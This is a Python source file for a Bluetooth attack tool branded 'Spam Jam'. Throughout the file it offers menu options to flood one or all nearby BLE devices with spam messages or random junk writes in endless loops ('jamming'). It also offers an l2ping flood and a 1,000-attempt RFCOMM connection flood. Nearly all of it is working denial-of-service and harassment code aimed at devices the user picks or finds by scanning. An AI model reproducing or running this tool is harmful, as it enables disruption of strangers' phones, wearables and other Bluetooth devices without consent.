# [Imports and banner unchanged]
import os
import sys
import time
import random
import subprocess
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, ADDR_TYPE_PUBLIC, BTLEException

# 🎨 Spam Jam Banner
def print_banner():
    print(r"""
███████╗██████╗  █████╗ ███╗   ███╗         ██╗ █████╗ ███╗   ███╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║         ██║██╔══██╗████╗ ████║
███████╗██████╔╝███████║██╔████╔██║         ██║███████║██╔████╔██║
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
   ❤️💜 A WORLD OF BLE FUN 💜❤️
   👩‍💻 Author: ekoms savior
   🎯 Now with MORE Custom Attacks! 🎉
   """)
    print("💜 XOXO HACK THE PLANET! 💜\n")

# 🎯 BLE Spamming Class
class BLESpam(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleNotification(self, cHandle, data):
        print(f"🔔 Notification from BLE device: {data}")

# 🚀 Spam Single BLE Device
def spam_ble():
    target_mac = input("💜 Enter target BLE MAC address: ")
    print(f"🚀 Spamming device {target_mac} 💥💜")
    custom_message = input("💜 Enter your custom spam message: ").encode()

    try:
        print("🔎 Attempting connection with RANDOM address type...")
        peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
    except BTLEException:
        print("⚠️ RANDOM address type failed! Trying PUBLIC address type...")
        try:
            peripheral = Peripheral(target_mac, ADDR_TYPE_PUBLIC)
        except BTLEException as e:
            print(f"❌ Failed to connect to {target_mac}. Error: {e}")
            return

    peripheral.setDelegate(BLESpam())
    while True:
        try:
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"💜 Spammed: {custom_message.decode(errors='ignore')}")
            time.sleep(0.5)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            break

# 🚀 Spam All BLE Devices
def spam_all_ble():
    print("🔎 Scanning for BLE devices to spam 📡")
    scanner = Scanner()
    try:
        devices = scanner.scan(10.0)
    except BTLEException as e:
        print(f"⚠️ Scan failed: {e}")
        return

    if not devices:
        print("⚠️ No BLE devices found.")
        return

    custom_message = input("💜 Enter your spam message for all devices: ").encode()
    for device in devices:
        try:
            print(f"🚀 Trying to spam {device.addr} 💌")
            peripheral = Peripheral(device.addr, ADDR_TYPE_RANDOM)
            peripheral.setDelegate(BLESpam())
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"💜 Spammed {device.addr}")
            peripheral.disconnect()
        except Exception as e:
            print(f"⚠️ Could not spam {device.addr}: {e}")

# 🚫 Jam Single BLE Device (Enhanced)
def jam_ble():
    print("🔎 Resetting BLE scan before jamming...")
    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def random_mac():
        return ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))

    while True:
        scanner = Scanner()
        try:
            devices = scanner.scan(10.0)
        except BTLEException as e:
            print(f"⚠️ BLE Scan Failed: {e}")
            continue

        if not devices:
            print("⚠️ No devices found!")
            continue

        for idx, device in enumerate(devices):
            print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")

        try:
            idx = int(input("💜 Enter index of device to jam: "))
            target = devices[idx].addr
        except (ValueError, IndexError):
            print("⚠️ Invalid choice.")
            continue

        print(f"💥 Jamming {target} 🚫")
        try:
            peripheral = Peripheral(target)
            while True:
                junk = os.urandom(random.randint(20, 50))
                peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
                print(f"🚫 Jammed {target}")
                time.sleep(random.uniform(0.05, 0.2))
        except Exception as e:
            print(f"⚠️ Error: {e}")
            retry = input("💜 Try another? (y/n): ").strip().lower()
            if retry != 'y':
                break

# 🚫 Jam All BLE Devices
def jam_all_ble():
    print("🔎 Scanning for BLE devices to jam 📡")
    scanner = Scanner()
    try:
        devices = scanner.scan(10.0)
    except BTLEException as e:
        print(f"⚠️ Scan failed: {e}")
        return

    if not devices:
        print("⚠️ No BLE devices found.")
        return

    print(f"🚫 Starting multi-device jammer...")
    try:
        while True:
            for device in devices:
                try:
                    peripheral = Peripheral(device.addr)
                    junk = os.urandom(random.randint(20, 50))
                    peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
                    print(f"💥 Jammed {device.addr}")
                    peripheral.disconnect()
                    time.sleep(random.uniform(0.05, 0.2))
                except Exception as e:
                    print(f"⚠️ Skipped {device.addr}: {e}")
    except KeyboardInterrupt:
        print("🛑 Jam All stopped.")

# 🔎 Bluetooth Scanner
def scan_bluetooth():
    print("🔎 Scanning for Bluetooth devices...")
    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        scanner = Scanner()
        devices = scanner.scan(10.0)
        if not devices:
            print("⚠️ No Bluetooth devices found.")
            return
        for idx, d in enumerate(devices):
            print(f"🔹 {idx}: {d.addr} ({d.addrType}), RSSI={d.rssi} dB")
    except BTLEException as e:
        print(f"⚠️ Scan failed: {e}")

# Other unchanged functions (l2ping_attack, rfcomm_flood, start_bluetooth)
# ✂️ [same as before]

def l2ping_attack():
    while True:
        addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")
        if os.geteuid() != 0:
            print("⚠️  L2Ping needs root! Try: sudo python3 spam_jam.py")
            return
        print(f"💥 Sending L2Ping flood to {addr}")
        try:
            subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
            print("✅ L2Ping attack successful!")
            break
        except subprocess.CalledProcessError:
            print(f"⚠️ Failed. Device may be offline.")
            if input("💜 Try another? (y/n): ").strip().lower() != 'y':
                break

def rfcomm_flood():
    addr = input("💜 Enter Bluetooth Device Address for RFCOMM Flood: ")
    if not addr:
        print("⚠️ No address. Exiting.")
        return
    print(f"💥 Starting RFCOMM flood on {addr}...")
    for i in range(1000):
        try:
            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True)
            print(f"✅ Attempt {i+1}: Connected")
        except subprocess.CalledProcessError:
            print(f"⚠️ Attempt {i+1}: Failed")

def start_bluetooth():
    print("📡 Starting Bluetooth service...")
    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
    print("✅ Bluetooth service started!")

# 🏁 Main Menu
def main():
    print_banner()
    while True:
        print("\n🔹 1️⃣ Spam a BLE device 💌")
        print("🔹 2️⃣ Jam a BLE device 🚫")
        print("🔹 3️⃣ Scan for Bluetooth devices 📡")
        print("🔹 4️⃣ L2Ping Attack 💥")
        print("🔹 5️⃣ RFCOMM Flood 💥")
        print("🔹 6️⃣ Start Bluetooth Service 📡")
        print("🔹 7️⃣ Quit 🚪")
        print("🔹 8️⃣ Spam All BLE Devices 💌💥")
        print("🔹 9️⃣ Jam All BLE Devices 🚫💥")

        choice = input("💜 Choose an option (1-9): ")
        functions = [spam_ble, jam_ble, scan_bluetooth, l2ping_attack, rfcomm_flood, start_bluetooth, None, spam_all_ble, jam_all_ble]

        if choice == "7":
            print("👋 Goodbye, fren! XOXOXO 💜")
            sys.exit()
        elif choice in map(str, range(1, 10)):
            func = functions[int(choice)-1]
            if func:
                func()
        else:
            print("⚠️ Invalid choice. Try again! 💜")

if __name__ == "__main__":
    main()
